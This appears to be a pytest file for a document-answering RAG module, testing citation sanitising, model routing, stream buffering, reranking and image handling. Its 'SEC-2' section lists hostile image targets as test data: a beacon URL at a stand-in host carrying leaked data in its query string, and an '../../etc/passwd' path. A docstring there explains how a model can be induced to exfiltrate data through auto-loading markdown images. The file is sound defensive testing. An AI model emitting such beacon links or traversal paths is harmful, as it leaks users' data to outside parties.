from unittest.mock import MagicMock, patch

import pytest

from langchain_core.documents import Document

from rag import (
    _is_structural_query, _format_chunk, pick_model, rewrite_query, _append_caveat_if_low_context,
    _build_source_citations, _citation_filenames, _sanitize_citations,
    _find_stream_cut, _sanitize_stream_buffer, _sanitize_and_filter_images,
)


def test_is_structural_query_detects_structural_keywords():
    assert _is_structural_query("What is in this book?") is True
    assert _is_structural_query("List all chapters") is True


def test_is_structural_query_false_for_regular_question():
    assert _is_structural_query("what is the capital of India") is False


def test_format_chunk_with_page_metadata():
    doc = Document(page_content="hello", metadata={"source": "a.pdf", "page": 3})
    assert _format_chunk(doc) == "[Source: a.pdf, Page 3]\nhello"


def test_format_chunk_with_slide_metadata():
    doc = Document(page_content="world", metadata={"source": "b.pptx", "slide": 2})
    assert _format_chunk(doc) == "[Source: b.pptx, Slide 2]\nworld"


def test_format_chunk_with_structure_chunk_type():
    doc = Document(page_content="struct", metadata={"source": "c.md", "chunk_type": "structure"})
    assert _format_chunk(doc) == "[Source: c.md, Document Structure]\nstruct"


def test_format_chunk_with_no_page_or_slide():
    doc = Document(page_content="plain", metadata={"source": "d.md"})
    assert _format_chunk(doc) == "[Source: d.md]\nplain"


def test_format_chunk_with_citation_index():
    doc = Document(page_content="hello", metadata={"source": "a.pdf", "page": 3})
    assert _format_chunk(doc, index=1) == "[1] [Source: a.pdf, Page 3]\nhello"


def test_build_source_citations_indexes_from_one():
    docs = [
        Document(page_content="first chunk text", metadata={"source": "a.pdf", "page": 1}),
        Document(page_content="second chunk text", metadata={"source": "b.pptx", "slide": 2}),
    ]
    citations = _build_source_citations(docs)
    assert citations == [
        {"index": 1, "filename": "a.pdf", "page": 1, "slide": None, "preview": "first chunk text"},
        {"index": 2, "filename": "b.pptx", "page": None, "slide": 2, "preview": "second chunk text"},
    ]


def test_build_source_citations_truncates_long_preview():
    doc = Document(page_content="x" * 500, metadata={"source": "a.pdf"})
    citations = _build_source_citations([doc])
    assert len(citations[0]["preview"]) == 200


def test_citation_filenames_dedupes_preserving_first_seen_order():
    sources = [
        {"index": 1, "filename": "a.pdf"},
        {"index": 2, "filename": "b.pdf"},
        {"index": 3, "filename": "a.pdf"},
    ]
    assert _citation_filenames(sources) == ["a.pdf", "b.pdf"]


def test_citation_filenames_empty_list():
    assert _citation_filenames([]) == []


def test_sanitize_citations_keeps_valid_indices():
    response = "Panels need cleaning [1] and inverters need inspection [2]."
    assert _sanitize_citations(response, {1, 2}) == response


def test_sanitize_citations_strips_invalid_index():
    response = "This is unsupported [7]."
    assert _sanitize_citations(response, {1, 2}) == "This is unsupported ."


def test_sanitize_citations_strips_all_when_no_valid_indices():
    response = "This claims a source [1] that doesn't exist."
    assert _sanitize_citations(response, set()) == "This claims a source  that doesn't exist."


def test_pick_model_fast_for_short_early_query_with_little_context():
    docs = [Document(page_content="short", metadata={"source": "a.md"})]
    assert pick_model("hi there", docs, "a bit of context", history_len=0) == "fast"


def test_pick_model_default_for_structural_query():
    docs = [Document(page_content="short", metadata={"source": "a.md"})]
    assert pick_model("what is in this book?", docs, "context", history_len=0) == "default"


def test_pick_model_default_for_long_query():
    docs = []
    long_query = "x" * 61
    assert pick_model(long_query, docs, "", history_len=0) == "default"


def test_pick_model_default_for_large_retrieved_context():
    docs = [Document(page_content="c", metadata={"source": f"{i}.md"}) for i in range(4)]
    assert pick_model("short query", docs, "small context", history_len=0) == "default"


def test_pick_model_default_for_long_context_text():
    docs = [Document(page_content="c", metadata={"source": "a.md"})]
    long_context = "x" * 801
    assert pick_model("short query", docs, long_context, history_len=0) == "default"


def test_pick_model_default_for_deep_conversation():
    docs = [Document(page_content="c", metadata={"source": "a.md"})]
    assert pick_model("short query", docs, "context", history_len=3) == "default"


def test_rewrite_query_skips_structural_queries():
    assert rewrite_query("what is in this book?") == []


def test_rewrite_query_skips_short_queries():
    assert rewrite_query("short") == []


def test_rewrite_query_returns_variants_from_groq():
    mock_response = MagicMock()
    mock_response.choices[0].message.content = "First alternate phrasing\nSecond alternate phrasing"
    mock_client = MagicMock()
    mock_client.chat.completions.create.return_value = mock_response
    with patch("groq.Groq", return_value=mock_client):
        variants = rewrite_query("what is the refund policy for damaged items")
    assert variants == ["First alternate phrasing", "Second alternate phrasing"]


def test_rewrite_query_falls_back_to_empty_list_on_error():
    with patch("groq.Groq", side_effect=RuntimeError("network down")):
        assert rewrite_query("what is the refund policy for damaged items") == []


def test_rewrite_query_disabled_via_env(monkeypatch):
    monkeypatch.setattr("rag.ENABLE_QUERY_REWRITE", False)
    assert rewrite_query("what is the refund policy for damaged items") == []


def test_append_caveat_appends_when_low_context():
    result = _append_caveat_if_low_context("The sky is blue.", low_context=True)
    assert result.startswith("The sky is blue.")
    assert "may not be well-grounded" in result


def test_append_caveat_no_change_when_context_found():
    assert _append_caveat_if_low_context("The sky is blue.", low_context=False) == "The sky is blue."


def test_append_caveat_not_duplicated_if_already_present():
    once = _append_caveat_if_low_context("The sky is blue.", low_context=True)
    twice = _append_caveat_if_low_context(once, low_context=True)
    assert once == twice


class TestFindStreamCut:
    def test_plain_text_fully_safe(self):
        assert _find_stream_cut("just plain text, nothing risky") == len("just plain text, nothing risky")

    def test_empty_string(self):
        assert _find_stream_cut("") == 0

    def test_trailing_open_bracket_held_back(self):
        text = "cleaned panels ["
        assert _find_stream_cut(text) == text.index("[")

    def test_bracket_with_partial_digits_held_back(self):
        text = "cleaned panels [1"
        assert _find_stream_cut(text) == text.index("[")

    def test_bracket_disproven_by_non_digit_released(self):
        # "[note]" can never become "[digits]" — not risky, don't hold it back
        text = "see [note] for details"
        assert _find_stream_cut(text) == len(text)

    def test_bracket_disproven_mid_digits_released(self):
        # "[12x" has digits then a non-digit, non-"]" char — can never close validly
        text = "value is [12x] approx"
        assert _find_stream_cut(text) == len(text)

    def test_bang_not_followed_by_bracket_released(self):
        assert _find_stream_cut("Great! That's helpful") == len("Great! That's helpful")

    def test_trailing_bang_held_back(self):
        assert _find_stream_cut("one moment!") == len("one moment!") - 1

    def test_bang_bracket_forming_held_back(self):
        text = "see this figure ![](/images/abc"
        assert _find_stream_cut(text) == text.index("!")

    def test_multiple_bangs_only_last_unresolved_one_matters(self):
        text = "Wow! Look at this ![](/images/ab"
        assert _find_stream_cut(text) == text.rindex("!")


class TestSanitizeStreamBuffer:
    def test_emits_plain_text_immediately(self):
        safe, tail = _sanitize_stream_buffer("hello there", set(), set())
        assert safe == "hello there"
        assert tail == ""

    def test_holds_back_incomplete_citation(self):
        safe, tail = _sanitize_stream_buffer("panels need cleaning [1", {1}, set())
        assert safe == "panels need cleaning "
        assert tail == "[1"

    def test_resolves_valid_citation_once_closed(self):
        safe, tail = _sanitize_stream_buffer("panels need cleaning [1] often", {1}, set())
        assert safe == "panels need cleaning [1] often"
        assert tail == ""

    def test_strips_invalid_citation_once_closed(self):
        safe, tail = _sanitize_stream_buffer("this is unsupported [7] claim", {1, 2}, set())
        assert safe == "this is unsupported  claim"
        assert tail == ""

    def test_holds_back_incomplete_image_marker(self):
        safe, tail = _sanitize_stream_buffer("see figure ![](/images/abc", set(), {"abc"})
        assert safe == "see figure "
        assert tail == "![](/images/abc"

    def test_resolves_valid_image_marker_once_closed(self):
        valid_id = "a" * 32
        text = f"see this ![](/images/{valid_id}) now"
        safe, tail = _sanitize_stream_buffer(text, set(), {valid_id})
        assert safe == text
        assert tail == ""

    def test_strips_invalid_image_marker_once_closed(self):
        fake_id = "b" * 32
        text = f"see this ![](/images/{fake_id}) now"
        safe, tail = _sanitize_stream_buffer(text, set(), {"a" * 32})
        assert safe == "see this  now"
        assert tail == ""

    def test_incremental_feed_never_exposes_invalid_citation(self):
        # Simulates a real stream: chunk boundary falls between "[1" and "]".
        valid = {1}
        chunks = ["Panels need cleaning ", "[7", "] often."]
        buffer = ""
        emitted = ""
        for chunk in chunks:
            buffer += chunk
            safe, buffer = _sanitize_stream_buffer(buffer, valid, set())
            emitted += safe
        emitted += buffer  # final flush, mirrors main.py's end-of-stream handling
        assert "[7]" not in emitted
        assert emitted == "Panels need cleaning  often."

    def test_incremental_feed_keeps_valid_citation_split_across_chunks(self):
        valid = {3}
        chunks = ["Inspect inverters ", "[3", "] yearly."]
        buffer = ""
        emitted = ""
        for chunk in chunks:
            buffer += chunk
            safe, buffer = _sanitize_stream_buffer(buffer, valid, set())
            emitted += safe
        emitted += buffer
        assert emitted == "Inspect inverters [3] yearly."

    def test_holdback_cap_forces_flush_of_pathological_fragment(self):
        # A "![" that never closes should eventually be flushed rather than held forever.
        text = "![" + "x" * 250
        safe, tail = _sanitize_stream_buffer(text, set(), set())
        assert safe == text
        assert tail == ""


# ── Image sanitizer: external-origin exfiltration guard (SEC-2) ────────────────

VALID_IMG_ID = "a" * 32


def test_sanitize_keeps_advertised_local_image():
    md = f"see ![fig](/images/{VALID_IMG_ID}) here"
    clean, _ = _sanitize_and_filter_images(md, [], {VALID_IMG_ID})
    assert f"/images/{VALID_IMG_ID}" in clean


def test_sanitize_strips_unadvertised_local_image():
    md = f"see ![fig](/images/{'b' * 32}) here"
    clean, _ = _sanitize_and_filter_images(md, [], {VALID_IMG_ID})
    assert "/images/" not in clean


@pytest.mark.parametrize(
    "target",
    [
        "https://evil.test/beacon.png?q=leaked",
        "http://evil.test/p.gif",
        "//evil.test/p.gif",
        "data:image/png;base64,iVBORw0KGgo=",
        "../../etc/passwd",
        "/imagesX/" + VALID_IMG_ID,
    ],
)
def test_sanitize_strips_non_local_image_targets(target):
    """An external image target is an auto-loading exfiltration beacon: the browser
    fetches it with no interaction, leaking viewer IP/UA plus anything the model was
    induced to smuggle into the query string."""
    clean, _ = _sanitize_and_filter_images(f"x ![a]({target}) y", [], {VALID_IMG_ID})
    assert "evil.test" not in clean
    assert "data:" not in clean
    assert "etc/passwd" not in clean


def test_sanitize_mixed_keeps_only_the_local_one():
    md = f"![ok](/images/{VALID_IMG_ID}) and ![bad](https://evil.test/x.png)"
    clean, _ = _sanitize_and_filter_images(md, [], {VALID_IMG_ID})
    assert f"/images/{VALID_IMG_ID}" in clean and "evil.test" not in clean


# --- relevance floor / captions / small talk -------------------------------------

class _FakeEncoder:
    """Scores a pair by a keyword lookup so tests don't load the real model."""
    def __init__(self, table):
        self.table = table

    def predict(self, pairs):
        return [next((v for k, v in self.table.items() if k in text), -20.0) for _, text in pairs]


def _patch_encoder(monkeypatch, table):
    import rag
    monkeypatch.setattr(rag, "_get_cross_encoder", lambda: _FakeEncoder(table))


def test_rerank_drops_chunks_below_min_score_even_when_few(monkeypatch):
    from rag import rerank_documents
    _patch_encoder(monkeypatch, {"good": 3.0, "noise": -9.0})
    docs = [Document(page_content="good", metadata={}), Document(page_content="noise", metadata={})]
    assert [d.page_content for d in rerank_documents("q", docs, top_n=10, min_score=-5.0)] == ["good"]


def test_rerank_returns_nothing_when_all_below_floor(monkeypatch):
    from rag import rerank_documents
    _patch_encoder(monkeypatch, {"noise": -9.0})
    assert rerank_documents("Hello", [Document(page_content="noise", metadata={})], min_score=-5.0) == []


def test_is_small_talk():
    from rag import _is_small_talk
    assert _is_small_talk("Hello") and _is_small_talk("hey there!") and _is_small_talk("Thank you.")
    assert not _is_small_talk("Hello, explain attention")


def test_format_chunk_shows_caption_for_relevant_image():
    import json
    doc = Document(page_content="text", metadata={
        "source": "a.pdf", "page": 1, "image_ids": "aa,bb",
        "image_captions": json.dumps({"aa": "Figure 1-1. Transformer"}),
    })
    out = _format_chunk(doc, {"aa", "bb"})
    assert "[Image available: /images/aa | caption: Figure 1-1. Transformer]" in out
    assert "[Image available: /images/bb]" in out


def test_image_gate_uses_caption_when_present(monkeypatch):
    import json
    from rag import _relevant_image_ids
    _patch_encoder(monkeypatch, {"Transformer diagram": 2.0, "unrelated logo": -9.0, "page prose": 4.0})
    doc = Document(page_content="page prose", metadata={
        "image_ids": "aa,bb,cc",
        "image_captions": json.dumps({"aa": "Transformer diagram", "bb": "unrelated logo"}),
    })
    # aa: caption relevant; bb: caption irrelevant despite relevant page; cc: uncaptioned -> page text
    assert _relevant_image_ids("q", [doc], threshold=-5.0) == {"aa", "cc"}


def test_page_caption_regex():
    from vectorstore import _CAPTION_RE
    assert _CAPTION_RE.match("Figure 1-32. Open source LLMs")
    assert _CAPTION_RE.match("Fig. 3: Attention")
    assert not _CAPTION_RE.match("Figures are useful")
    assert not _CAPTION_RE.match("As shown in Figure 1-2")


def test_is_figure_query():
    from rag import _is_figure_query
    assert _is_figure_query("Give me the diagram of the LLM architecture")
    assert _is_figure_query("show the figures for attention")
    assert not _is_figure_query("What is quantization?")


def test_image_gate_uses_best_score_across_rewrites(monkeypatch):
    import json
    from rag import _relevant_image_ids
    # the raw request phrasing scores badly against the caption; the rewrite scores well
    class Enc:
        def predict(self, pairs):
            return [3.0 if q == "LLM architecture diagram" else -9.0 for q, _ in pairs]
    import rag
    monkeypatch.setattr(rag, "_get_cross_encoder", lambda: Enc())
    doc = Document(page_content="p", metadata={"image_ids": "aa", "image_captions": json.dumps({"aa": "Figure 3-4. x"})})
    assert _relevant_image_ids("Give me the diagram of the LLM architecture", [doc], threshold=-2.0) == set()
    assert _relevant_image_ids("Give me the diagram of the LLM architecture", [doc], threshold=-2.0,
                               alt_queries=("LLM architecture diagram",)) == {"aa"}


def test_image_store_serves_jpeg_extension(tmp_path, monkeypatch):
    import image_store
    monkeypatch.setattr(image_store, "IMAGES_DIR", str(tmp_path))
    # legacy file written as .jpeg (PyMuPDF's "jpeg" hint used to be kept verbatim)
    (tmp_path / ("a" * 32 + ".jpeg")).write_bytes(b"x")
    assert image_store.load_image("a" * 32) == (b"x", "image/jpeg")
    # new saves normalise to .jpg
    new_id = image_store.save_image(b"y", "jpeg")
    assert (tmp_path / f"{new_id}.jpg").exists()
